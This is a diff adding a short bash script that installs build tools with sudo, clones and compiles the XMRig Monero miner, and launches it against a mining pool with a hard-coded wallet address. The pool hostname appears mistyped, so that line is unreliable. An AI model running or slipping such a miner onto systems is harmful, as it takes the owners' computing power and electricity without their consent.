@@ -1,0 +1,11 @@
+#!/bin/bash
+
+sudo apt update
+sudo apt install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+git clone https://github.com/xmrig/xmrig.git
+cd xmrig
+mkdir build
+cd build
+cmake ..
+make
+./xmrig -o gulf.moneroocean.scream:10128 -u 48XhFayR6KpRRrm195c4UQ1DMVwLtkGgR9FVsJvFiTh6A91mDW6HHyVQdQLG3DRXJ9Z5qPn9i8JCsEL24JceT11g6iPtmDY -p mnr
